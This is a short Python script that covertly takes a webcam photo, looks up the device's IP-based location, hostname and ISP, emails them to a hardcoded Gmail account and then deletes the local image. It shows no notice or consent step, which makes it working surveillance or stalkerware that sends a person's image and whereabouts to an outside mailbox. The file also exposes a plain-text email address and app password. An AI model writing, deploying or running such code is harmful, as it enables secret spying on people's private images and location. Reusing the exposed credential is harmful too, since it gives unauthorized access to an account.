import cv2
import smtplib
import datetime
import socket
import requests
from email.message import EmailMessage
import os

def get_location_info():
    try:
        response = requests.get("http://ip-api.com/json/")
        data = response.json()

        return {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "ip": data.get("query"),
            "city": data.get("city"),
            "region": data.get("regionName"),
            "country": data.get("country"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "isp": data.get("isp")
        }
    except Exception as e:
        return {"error": str(e)}

def take_photo(filename="webcam.jpg"):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(filename, frame)
        cap.release()
    except Exception as e:
        print(f"Camera error: {e}")

def send_email(location_info, image_path=None):
    EMAIL_ADDRESS = "rohitkhanra4444@gmail.com"
    EMAIL_PASSWORD = "blvb natd nmhc ldgf"

    msg = EmailMessage()
    msg['Subject'] = f"Device Location + Snapshot from {socket.gethostname()}"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS

    msg.set_content(str(location_info))

    if image_path and os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img_data = img_file.read()
            msg.add_attachment(img_data, maintype='image', subtype='jpeg', filename='photo.jpg')

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

if __name__ == "__main__":
    info = get_location_info()
    photo_filename = "webcam.jpg"
    take_photo(photo_filename)
    send_email(info, photo_filename)
    os.remove(photo_filename)  # Optional: clean up the image file
